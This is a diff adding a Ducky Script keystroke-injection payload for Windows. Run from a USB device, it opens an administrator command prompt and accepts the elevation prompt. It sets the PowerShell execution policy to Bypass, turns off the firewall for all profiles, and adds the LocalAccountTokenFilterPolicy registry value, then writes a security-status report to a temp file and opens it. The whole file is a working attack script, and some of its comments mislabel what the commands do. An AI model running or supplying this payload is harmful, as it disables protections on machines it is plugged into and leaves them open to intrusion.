@@ -1,0 +1,80 @@
+REM - Open a command prompt as Administrator
+REM -------------------------- 
+
+GUI r
+DELAY 500
+STRING cmd.exe
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+
+REM - Bypass Script Execution Policy
+REM --------------------------
+
+DELAY 500
+STRING PowerShell.exe -c "Set-ExecutionPolicy -ExecutionPolicy Bypass"
+DELAY 500
+ENTER
+
+REM - Disable WinDefender
+REM --------------------------
+
+DELAY 1000
+STRING netsh advfirewall set allprofiles state off
+DELAY 500
+ENTER
+
+REM - Disable UAC
+REM --------------------------
+
+DELAY 500
+STRING PowerShell.exe -c "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1"
+DELAY 500
+ENTER
+DELAY 500
+STRING Yes
+DELAY 500
+ENTER
+
+REM - Write Windows security features status into a text file
+REM --------------------------
+
+DELAY 500
+STRING cls
+DELAY 500
+ENTER
+
+DELAY 500
+STRING echo WinDefend status: > C:\Windows\Temp\WindowsSecurityStatus.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING netsh advfirewall show allprofiles >> C:\Windows\Temp\WindowsSecurityStatus.txt
+DELAY 500
+ENTER
+
+DELAY 500
+STRING echo User Access Control (UAC) status: >> C:\Windows\Temp\WindowsSecurityStatus.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" >> C:\Windows\Temp\WindowsSecurityStatus.txt
+DELAY 500
+ENTER
+
+DELAY 500
+STRING echo PowerShell execution policy status: >> C:\Windows\Temp\WindowsSecurityStatus.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING PowerShell -c "Get-ExecutionPolicy" >> C:\Windows\Temp\WindowsSecurityStatus.txt
+DELAY 500
+ENTER
+
+DELAY 500
+STRING notepad.exe C:\Windows\Temp\WindowsSecurityStatus.txt & exit
+DELAY 500
+ENTER
